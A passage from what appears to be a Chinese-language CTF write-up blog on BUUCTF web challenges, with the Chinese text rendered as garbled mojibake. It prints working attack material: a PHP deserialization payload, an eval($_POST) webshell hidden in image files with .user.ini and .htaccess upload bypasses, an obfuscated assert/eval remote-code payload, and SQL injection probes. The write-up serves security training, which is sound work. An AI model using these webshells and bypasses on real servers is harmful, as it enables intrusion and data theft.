class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹passwordå˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥passwordå°±æ˜¯åºåˆ—åŒ–åçš„å€¼</p><p>åˆ©ç”¨<code>useless.php</code>æ„é€ åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>è¿è¡Œå        </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure><p>æœ€åpayload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//ä»”ç»†ä¸€ä¸‹ä¼šæ³¨æ„åˆ°è¿™é‡Œçš„fileçš„å€¼ä¸­ï¼Œä¼ªåè®®åˆ é™¤äº†ï¼Œ</span><br><span class="line">è¿™æ˜¯å› ä¸ºå¼€å§‹é»˜è®¤éƒ½æ˜¯<span class="keyword">index</span>.phpï¼Œä½†æ˜¯<span class="keyword">index</span>.phpæ²¡æœ‰Flagç±»ï¼Œ</span><br><span class="line">å¦‚æœæƒ³æ‰§è¡Œååºåˆ—åŒ–ï¼Œé‚£å°±éœ€è¦åŒ…å«Flagç±»ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„useless.phpé‡Œçš„</span><br><span class="line">æ‰€ä»¥è¿™é‡Œåˆ é™¤fileé‡Œçš„ä¼ªåè®®ï¼Œåªç•™useless.phpçš„æ–‡ä»¶å</span><br><span class="line">å°±æ˜¯åˆ©ç”¨  <span class="keyword">include</span>($file); </span><br><span class="line">æŠŠuseless.phpåŒ…å«åœ¨<span class="keyword">index</span>.phpé‡Œï¼Œä»è€Œå¯ä»¥æˆåŠŸæ‰§è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è¯•è¯•</p><p><img src="/2022/06/21/buuctf-wp/image-20220825173012665.png" alt="image-20220825173012665"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetypeæ˜¯åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹çš„è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªèƒ½ä¸Šä¼ å›¾ç‰‡</p><p>å…ˆä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPæœ¨é©¬çš„å›¾ç‰‡é©¬è¯•è¯•</p><p><img src="/2022/06/21/buuctf-wp/image-20220825174837632.png" alt="image-20220825174837632"></p><p>çœ‹æ¥æ˜¯è¿‡æ»¤äº†<code>&lt;?</code>ï¼Œæ‰€ä»¥é™¤äº†php,å…¶ä»–çš„asp,aspx,jsp,jséƒ½å¯ä»¥ç»•è¿‡</p><p>è¿™é‡Œä»¥jsä¸¾ä¾‹</p><p>åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œå†…å®¹ä¸º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>åœ¨å’Œä¸€ä¸ªæ™®é€šå›¾ç‰‡åˆæˆï¼Œä¹Ÿå¯ä»¥åŠ ä¸ªæ–‡ä»¶å¤´GIF89a</p><p>å›¾ç‰‡é©¬åä¸º<code>haha.gif</code></p><p>ç„¶åä¸Šä¼ </p><p><img src="/2022/06/21/buuctf-wp/image-20220825210858681.png" alt="image-20220825210858681"></p><p>ç”±äºä¸æ˜¯phpæœ¨é©¬ï¼Œæ‰€ä»¥æ— æ³•ç”¨<code>.htaccess</code>æ–‡ä»¶ç»•è¿‡</p><p>è¿™é‡Œå°±éœ€è¦ç”¨<code>.user.ini</code>é…ç½®æ–‡ä»¶,å½“ç„¶ä½¿ç”¨å‰ææ˜¯<code>.user.ini</code>æ–‡ä»¶ä¸‹æœ‰phpæ–‡ä»¶ï¼Œä¸ç„¶ä¹Ÿä¸èƒ½åŒ…å«äº†</p><p>æ¨èçœ‹ä¸€ä¸‹è¿™ç¯‡<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p><p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p><p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p><p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œè®¾ç½®è‡ªåŠ¨åŒ…å«çš„æ–‡ä»¶ä¸º<code>haha.gif</code></p><p>äºæ˜¯<code>.user.ini</code>å†…å®¹ä¸º</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a       <span class="comment">//ç»•è¿‡å›¾ç‰‡åˆ¤æ–­         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ <code>.user.ini</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220825214029074.png" alt="image-20220825214029074"></p><p>è¿™ä¸ªæ—¶å€™haha.gifå°±å·²ç»åŒ…å«åœ¨index.phpï¼Œå¯ä»¥è®¿é—®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure><p>èƒ½çœ‹åˆ°<code>GIF98a?</code></p><p>ç„¶åä¹Ÿå¯ä»¥ç”¨hackbarï¼Œpostä¸Šä¼ å‘½ä»¤ï¼Œå¦‚å›¾ä¸­çš„phpinfo()</p><p><img src="/2022/06/21/buuctf-wp/image-20220825215617387.png" alt="image-20220825215617387"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//çœ‹çœ‹æ ¹ç›®å½•ï¼Œæ‰¾åˆ°flag</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220825220933577.png" alt="image-20220825220933577"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//è¯»å–flagæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220825221229971.png" alt="image-20220825221229971"></p><hr><p>å½“ç„¶ç”¨èšå‰‘æœ€ç®€å•ï¼Œè¿æ¥ä¹ŸæˆåŠŸ</p><p><img src="/2022/06/21/buuctf-wp/image-20220825214728996.png" alt="image-20220825214728996"></p><p>å¯ä»¥çœ‹åˆ°<strong>index.phpæ–‡ä»¶ä¹Ÿåœ¨ä¸Šä¼ çš„ç›®å½•</strong>ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>.user.ini</code>çš„åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥æ‰å¯ä»¥æˆåŠŸåŒ…å«</p><p><img src="/2022/06/21/buuctf-wp/image-20220825215454619.png" alt="image-20220825215454619"></p><p>åœ¨æ ¹ç›®å½•å‘ç°äº†flagï¼Œæ‰“å¼€å³å¯å¾—åˆ°flag</p><hr><p>ä½†æˆ‘å‘ç°æ ¹ç›®å½•ä¸€ä¸ªclean.shæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå®šæ—¶æ¸…ç©ºlinuxæœåŠ¡å™¨ä¸Šç¼“å­˜çš„æ–‡ä»¶è„šæœ¬ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å®šæ—¶åˆ é™¤</p><p><img src="/2022/06/21/buuctf-wp/image-20220825215047906.png" alt="image-20220825215047906"></p><p>è¿™æ˜¯ä¸€åˆ†é’Ÿå·¦å³åï¼Œé¶åœºç¯å¢ƒè¿˜åœ¨ä½†æ˜¯æ— æ³•è®¿é—®äº†ï¼Œæ‰€ä»¥è¦å¿«ç‚¹æ‹¿å–flag</p><p><img src="/2022/06/21/buuctf-wp/image-20220825215220524.png" alt="image-20220825215220524"></p><p>è¿™é‡Œæœ¬æ¥æƒ³åˆ æ‰clean.shï¼Œå‘ç°æ²¡æƒé™ï¼Œæ— æ³•æ‰§è¡Œï¼Œsudoä¹Ÿä¸è¡Œï¼Œé‚£å°±åªèƒ½é€Ÿæˆ˜é€Ÿå†³äº†</p><p><img src="/2022/06/21/buuctf-wp/image-20220825220024393.png" alt="image-20220825220024393"></p><p>æ ¹ç›®å½•å¾—åˆ°flag</p><h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜ä¸éš¾ï¼Œä½†æ˜¯å¼€å§‹ä¸æ¸…æ¥šè¿˜æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œ</p><p>è¿™é“é¢˜ä»‹ç»å‡ ä¸ªç‚¹å°±å¯ä»¥äº†</p><p>ç¬¬ä¸€ä¸ªæ˜¯è¿‡æ»¤äº†åç¼€åå«ph</p><p>ç¬¬äºŒä¹Ÿæ˜¯å…³é”®çš„ï¼Œå®ƒåªå…è®¸ä¸Šä¼ <code>content-type: image/jpeg</code>ï¼Œpngå’Œgiféƒ½ä¸å¯ä»¥</p><p>ç¬¬ä¸‰ç‚¹å°±æ˜¯å®ƒè¿‡æ»¤äº†æ–‡ä»¶å†…å®¹é‡Œå«<code>&lt;?</code></p><p>æ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªjpegæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹å†…å®¹ä¸ºéphpä½†åŒ…å«phpçš„ä¸€ä¸ªè„šæœ¬ï¼Œ</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè§£ææ‰€æœ‰æ–‡ä»¶ä¸ºphp</p><p>ç”¨èšå‰‘è¿æ¥jpegæ–‡ä»¶ï¼Œå³å¯</p><h2 id="11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆå¯¹ä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°codeè¢«æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥å­—æ¯å¤§å°å†™å’Œæ•°å­—éƒ½ä¸èƒ½è¾“å…¥</p><p>è¿™é‡Œå°±å­¦åˆ°æ–°ä¸œè¥¿äº†</p><p><strong>å–åç»•è¿‡</strong></p><p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p><p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†èµ‹å€¼</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨æ„åé¢è¦æœ‰ï¼›ï¼Œä»£è¡¨phpä»£ç ç»“æŸ</span></span><br><span class="line"><span class="comment">//è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å</span></span><br><span class="line"></span><br><span class="line">ç­‰åŒäº</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸ºæ–­è¨€(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))ï¼Œæ‰€ä»¥æŠŠ<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])å½“ä½œphpæ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°shelläº†</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">èšå‰‘è¿æ¥</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°flagæ˜¯ç©ºçš„</p><p><img src="/2022/06/21/buuctf-wp/image-20220903181221552.png" alt="image-20220903181221552"></p><p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpæ‰çŸ¥é“ï¼Œéœ€è¦èšå‰‘æ’ä»¶<code>disable_functions</code>ï¼Œç¦æ­¢ç½‘ç«™çš„å‡½æ•°ï¼Œé˜²æ­¢å…¶é˜»æ­¢è¯»å–flag</p><p><img src="/2022/06/21/buuctf-wp/image-20220903181348649.png" alt="image-20220903181348649"></p><p>å†åœ¨ä¸»é¡µå³é”®</p><p><img src="/2022/06/21/buuctf-wp/image-20220903181431745.png" alt="image-20220903181431745"></p><p>æ¨¡å¼é€‰æ‹©</p><p><img src="/2022/06/21/buuctf-wp/image-20220903181451266.png" alt="image-20220903181451266"></p><p>ç„¶åç‚¹å‡»å¼€å§‹</p><p>ç»ˆç«¯è¾“å…¥</p><p><code>/readflag</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220903181528195.png" alt="image-20220903181528195"></p><p>å¾—åˆ°flag</p><h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p><p><img src="/2022/06/21/buuctf-wp/image-20220909203922998.png" alt="image-20220909203922998"></p><p>æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç </p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è´¦å·ï¼š<span class="literal">admin</span></span><br><span class="line">å¯†ç ï¼š<span class="number">123456</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220909204018695.png" alt="image-20220909204018695"></p><p>æŠ¥é”™ï¼Œçœ‹æ¥ç”¨æˆ·åæ²¡é”™ï¼Œå¯†ç é”™è¯¯</p><p>æŸ¥çœ‹æºç çœ‹çœ‹</p><p><img src="/2022/06/21/buuctf-wp/image-20220909204046072.png" alt="image-20220909204046072"></p><p>å‘ç°æœ‰ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œçœ‹èµ·æ¥åƒbase</p><p>å…ˆç”¨<code>base32</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220909204202994.png" alt="image-20220909204202994"></p><p>çœ‹èµ·æ¥å°±æ˜¯<code>base32+base64</code>æ··åˆç¼–ç ï¼Œå†ç”¨<code>base64</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220909204325138.png" alt="image-20220909204325138"></p><hr><p>å½“ç„¶çœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥æ— è„‘<code>ciphey</code>ï¼Œä¹Ÿå¯ä»¥ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦äº†è§£ä¸åŒç¼–ç å’ŒåŠ å¯†å­—ç¬¦çš„ç‰¹ç‚¹</p><p><img src="/2022/06/21/buuctf-wp/image-20220909204746167.png" alt="image-20220909204746167"></p><p>ä¹Ÿå¯ä»¥å¾—åˆ°è§£ç ç»“æœ</p><hr><p>ç”±</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure><p>å¯çŸ¥ï¼Œsqlæ³¨å…¥ç‚¹åœ¨Usernameå¤„ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ</p><p>äºæ˜¯æˆ‘ä»¬å°æ„é€ æ³¨å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220909205630033.png" alt="image-20220909205630033"></p><p>å‘ç°æœ‰çš„å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzçˆ†ç ´æµ‹è¯•çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•</p><p>æˆ‘è¿™é‡Œå…ˆçˆ†ç ´è¯•è¯•ï¼ˆå»ºè®®çˆ†ç ´è¿˜æ˜¯æ…¢ä¸€äº›ï¼Œåé¢ç›´æ¥å¤ªå¤šè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å‘è¿”å›åŒ…äº†ï¼‰</p><p>å¤§æ¦‚ç»Ÿè®¡ä¸€ä¸‹</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰å…ˆè¯•è¯•è”åˆæ³¨å…¥</p><figure class="highlight 